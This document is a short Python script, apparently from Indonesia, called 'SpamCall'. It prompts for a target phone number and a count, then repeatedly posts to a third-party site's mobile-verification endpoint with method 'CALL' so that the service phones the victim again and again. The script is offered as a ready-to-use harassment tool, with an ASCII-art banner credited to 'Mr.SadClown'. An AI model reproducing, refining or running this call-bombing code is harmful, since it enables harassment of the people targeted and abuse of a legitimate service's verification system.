
#moduel
import os,sys,time,requests
from time import sleep

#Warna
red   = '\x1b[31m' # Merah
green = '\x1b[32m' # Hijau
yellow = '\x1b[33m' # Kuning
blue  = '\x1b[34m' # Biru
magenta = '\x1b[35m' # Ungu
cyan  = '\x1b[36m' # Biru Muda
white = '\x1b[37m' # Putih
reset = '\x1b[39m' # Reset Warna ( Kembali Ke Warna Awal )
brblack = '\x1b[90m' # Hitam Terang
R = '\x1b[91m' # Merah Terang
brgreen = '\x1b[92m' # Hijau Terang
k = '\x1b[93m' # Kuning Terang
brblue = '\x1b[94m' # Biru Terang
brmgnt = '\x1b[95m' # Ungu Terang
brcyan = '\x1b[96m' # Biru Muda Terang
G = '\x1b[97m' # Putih Terang

#Tampilan
print("\x1b[36m'")
os.system("clear")
sleep (1)
os.system('figlet SpamCall')
print("\x1b[91m")
banner="""
.        ╔═══════════╗ 
   ╔═╝███████████╚═╗
╔╝███████████████╚╗ 
║█████████████████║     Spam Call By Mr.SadClown
║█████████████████║     My Github : github.com/MrSadClown
║█████████████████║     My Team   : WHITE CYBER UNION
║█╔█████████████╗█║ 
╚╦╝███▒▒███▒▒███╚╦╝ 
╔╝██▒▒▒▒███▒▒▒▒██╚╗ 
║██▒▒▒▒▒███▒▒▒▒▒██║ 
║██▒▒▒▒█████▒▒▒▒██║ 
╚╗███████████████╔╝
╔═╬══╦╝██▒█▒██╚╦══╝.▒.. 
║█║══║█████████║　...▒.  
║█║══║█║██║██║█║　.▒..
║█║══╚═╩══╩╦═╩═╩═╦╗▒.  
╔╝█╚══╦═╦══╦╩═╦═╦═╩╝
╔╝█████║█║██║██║█║
║██████║█████████║"""
sleep (1)
print(banner)
print("\x1b[93m")
nomor = input("Nomer Target(8********) : ")
print("\x1b[34m")
jumlah = int(input("Jumlah Spam : "))

url = "https://id.jagreward.com/member/verify-mobile/"
ua = {'Host': "id.jagreward.com",'Connection': "keep-alive",'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.73 Mobile Safari/537.36'}
dat = {"method": "CALL","countryCode": "id",}

for i in range(jumlah):
    send = requests.post(url+nomor, headers=ua, data=dat)
    print(" [•] Status ~+> ",(send.json()["message"]))

